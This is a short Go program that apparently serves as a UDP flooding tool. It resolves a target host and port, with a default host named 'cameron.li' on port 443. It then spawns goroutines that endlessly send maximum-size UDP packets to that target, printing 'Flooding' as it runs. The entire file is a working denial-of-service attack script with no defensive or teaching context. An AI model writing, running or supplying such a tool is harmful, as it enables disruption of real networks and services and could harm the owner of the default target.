package main

import (
	"flag"
	"fmt"
	"net"
        "time"
)

var (
	_host    = flag.String("h", "cameron.li", "Specify Host")
	_port    = flag.Int("p", 443, "Specify Port")
	_threads = flag.Int("t", 1, "Specify threads")
	_size    = flag.Int("s", 65507, "Packet Size")
	_tempo    = flag.String("ts", "0ms", "Tempo Sleep")
)

func main() {
	flag.Parse()
	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
	var buf []byte = make([]byte, *_size)
	remoteAddr, _ := net.ResolveUDPAddr("udp", fullAddr)
	conn, err := net.DialUDP("udp", nil, remoteAddr)
	if err != nil {
		fmt.Println(err)
	} else {
		duracao, _ := time.ParseDuration(*_tempo)
		fmt.Printf("Flooding %s\n", fullAddr)
		for i := 0; i < *_threads; i++ {
			go func() {
				for {
					conn.Write(buf)
					time.Sleep(duracao)
				}
			}()
		}
	}
	<-make(chan bool, 1)
}
